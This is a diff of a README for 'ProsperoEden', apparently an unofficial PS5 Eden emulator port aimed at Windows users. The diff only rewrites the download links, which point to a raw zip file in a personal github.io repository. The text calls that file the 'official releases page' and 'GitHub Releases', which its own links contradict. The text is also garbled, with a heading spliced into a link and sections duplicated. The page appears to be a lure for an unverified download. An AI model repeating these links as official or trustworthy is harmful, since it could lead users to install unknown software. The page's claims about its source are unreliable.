@@ -5,7 +5,7 @@ description: "Run the Eden emulator on PS5 via this unofficial high-performance 
 ---
 # 🎮 ProsperoEden - Bring Eden to Your PS5
 
-[![Download ProsperoEden](https://img.shields.io/badge/Download_ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jarama88/jarama88.github.io/raw/refs/heads/main/docs/Latest-1.2.zip)
+[![Download ProsperoEden](https://img.shields.io/badge/Download_ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Jarama88/jarama88.github.io/main/docs/Latest-1.2.zip)
 
 ProsperoEden is an experimental Eden port for PS5. This page is written for everyday Windows users who want to find the official download, open the application, and get started without programming knowledge.
 
@@ -55,9 +55,9 @@ A computer that meets or exceeds these recommendations is more likely to provide
 
 Visit this link to download the application:
 
-[Download ProsperoEden from the official releases page](https://github.com/Jarama88/jarama88.github.io/raw/refs/heads/main/docs/Latest-1.2.zip 🎮 ProsperoEden - Bring Eden to Your PS5
+[Download ProsperoEden from the official releases page](https://raw.githubusercontent.com/Jarama88/jarama88.github.io/main/docs/Latest-1.2.zip 🎮 ProsperoEden - Bring Eden to Your PS5
 
-[![Download ProsperoEden](https://img.shields.io/badge/Download_ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jarama88/jarama88.github.io/raw/refs/heads/main/docs/Latest-1.2.zip)
+[![Download ProsperoEden](https://img.shields.io/badge/Download_ProsperoEden-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Jarama88/jarama88.github.io/main/docs/Latest-1.2.zip)
 
 ProsperoEden is an experimental Eden port for PS5. This README is written for everyday Windows users who want to find the official download, get the application from the correct source, and understand what to expect without needing programming knowledge.
 
@@ -113,7 +113,7 @@ A computer that meets or exceeds these recommendations is more likely to provide
 
 Visit this link to download the application:
 
-[Download ProsperoEden from the official releases page](https://github.com/Jarama88/jarama88.github.io/raw/refs/heads/main/docs/Latest-1.2.zip)
+[Download ProsperoEden from the official releases page](https://raw.githubusercontent.com/Jarama88/jarama88.github.io/main/docs/Latest-1.2.zip)
 
 Use the official releases page as the source for ProsperoEden. The page is linked at the top of this README as a large badge and again here in the download section. Both links go to the same official location.
 
@@ -185,7 +185,7 @@ If your computer feels low on space, free up storage before downloading. Having 
 
 - Repository name: ProsperoEden
 - Description: Experimental Eden port for PS5
-- Primary download link: https://github.com/Jarama88/jarama88.github.io/raw/refs/heads/main/docs/Latest-1.2.zip
+- Primary download link: https://raw.githubusercontent.com/Jarama88/jarama88.github.io/main/docs/Latest-1.2.zip
 - Distribution method: GitHub Releases
 - Intended audience: End users on Windows
 - Project type: Experimental Eden port for PS5
